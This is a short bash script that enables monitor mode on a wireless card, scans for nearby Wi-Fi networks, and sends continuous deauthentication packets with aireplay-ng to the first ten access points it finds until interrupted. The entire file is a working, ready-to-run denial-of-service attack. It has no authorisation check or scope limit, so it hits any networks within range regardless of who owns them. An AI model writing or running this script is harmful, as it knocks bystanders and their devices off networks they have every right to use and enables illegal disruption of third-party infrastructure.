#!/bin/bash

trap stop_attack INT

function stop_attack() {
    echo "[!] Stopping monitor mode and restoring network..."
    sudo airmon-ng stop wlan0mon >/dev/null
    sudo systemctl start NetworkManager
    killall aireplay-ng >/dev/null 2>&1
    exit
}

echo "[*] Stopping NetworkManager..."
sudo systemctl stop NetworkManager

echo "[*] Enabling monitor mode..."
sudo airmon-ng start wlan0 >/dev/null

echo "[*] Scanning for nearby Wi-Fi networks (10s)..."
sudo timeout 10s airodump-ng wlan0mon --output-format csv -w scan_results > /dev/null 2>&1

echo "[*] Extracting top 10 Wi-Fi BSSIDs..."
cat scan_results-01.csv | grep -aE "([0-9A-F]{2}:){5}[0-9A-F]{2}" | head -n 10 > top_aps.txt

IFS=$'\n'
count=1

for line in $(cat top_aps.txt); do
    bssid=$(echo "$line" | cut -d',' -f1 | tr -d ' ')
    channel=$(echo "$line" | cut -d',' -f4 | tr -d ' ')
    
    if [[ -n "$bssid" && -n "$channel" ]]; then
        echo "[*] Target #$count -> BSSID: $bssid | Channel: $channel"
        echo "[*] Switching to channel $channel..."
        sudo iwconfig wlan0mon channel "$channel"
        echo "[*] Sending continuous deauth packets to $bssid..."
        sudo aireplay-ng --deauth 0 -a "$bssid" wlan0mon &
        sleep 1
        ((count++))
    fi
done

echo "[*] All targets are under continuous deauth."
echo "[*] Press CTRL+C to stop and restore network."

while true; do sleep 1; done
